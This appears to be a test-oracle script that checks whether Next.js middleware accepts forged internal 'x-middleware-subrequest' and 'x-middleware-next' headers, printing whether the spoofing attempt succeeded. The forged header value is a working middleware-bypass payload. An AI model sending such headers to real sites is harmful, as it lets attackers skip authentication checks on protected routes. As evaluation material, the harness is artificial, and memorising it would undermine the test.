const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function finish() {
  const out = { operation_completed, exploit_succeeded, evidence };
  console.log('ORACLE_RESULT ' + JSON.stringify(out));
}

try {
  const markerDir = path.join(os.tmpdir(), 'oracle-next-mw-' + Date.now() + '-' + Math.random().toString(16).slice(2));
  fs.mkdirSync(markerDir, { recursive: true });

  const { NextRequest } = require('next/dist/server/web/spec-extension/request');
  const { NextResponse } = require('next/dist/server/web/spec-extension/response');

  // Benign operation first
  const benignReq = new NextRequest('https://example.test/protected');
  const benignRes = NextResponse.next();

  if (!benignReq || !benignRes || !benignRes.headers || typeof benignRes.headers.get !== 'function') {
    throw new Error('Benign middleware operation did not return expected objects');
  }

  operation_completed = true;

  // Malicious attempt: spoof internal middleware control headers
  const forged = new Headers();
  forged.set('x-middleware-subrequest', 'src/middleware:src/middleware:src/middleware');
  forged.set('x-middleware-next', '1');

  const malReq = new NextRequest('https://example.test/protected', { headers: forged });
  const malRes = NextResponse.next({ request: { headers: malReq.headers } });

  const observedSubrequest = malRes && malRes.headers ? malRes.headers.get('x-middleware-subrequest') : null;
  const observedNext = malRes && malRes.headers ? malRes.headers.get('x-middleware-next') : null;

  exploit_succeeded = !!(observedSubrequest && observedSubrequest.includes('src/middleware'));

  evidence = JSON.stringify({
    markerDir,
    observedSubrequest,
    observedNext,
    vulnerableSignal: exploit_succeeded
  });

  finish();
} catch (err) {
  if (!operation_completed) {
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failure:' + (err && err.message ? err.message : String(err));
    finish();
  } else {
    // After benign success, malicious-path exception means blocked
    exploit_succeeded = false;
    evidence = 'malicious_blocked_by_exception:' + (err && err.message ? err.message : String(err));
    finish();
  }
}
